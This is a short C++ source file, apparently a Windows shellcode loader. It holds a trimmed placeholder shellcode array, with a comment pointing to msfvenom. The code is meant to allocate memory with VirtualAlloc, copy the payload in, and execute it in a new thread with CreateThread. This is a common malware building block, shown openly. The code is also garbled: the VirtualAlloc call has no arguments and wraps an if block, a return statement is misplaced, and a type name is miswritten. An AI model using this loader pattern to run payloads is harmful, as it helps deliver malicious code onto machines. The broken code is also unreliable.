#include <fstream>

#include <iostream>

// A placeholder for actual shellcode. Normally you'd generate this with msfvenom or
// similar tools.

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8...";//trimmed for brevity


int main() {

    void* exec = VirtualAlloc(
    
    if(exec == nullptr){
         std::cerr << "Failed to allocate memory."<< std::endl;
    }
         return 1;    
)

    memcpy(exec,shellcode,
    sizeof(shellcode));

    // Create a new thread
    // that begins at the shellcode

    Handle thread =
    CreateThread(nullptr,0,
    (LPTHREAD_START_ROUTINE)exec,nullptr,0,
    nullptr);

    if(thread == nullptr){
        
        return 1;
    }

    WaitForSingleObject(thread,INFINITE);

    return 0;
}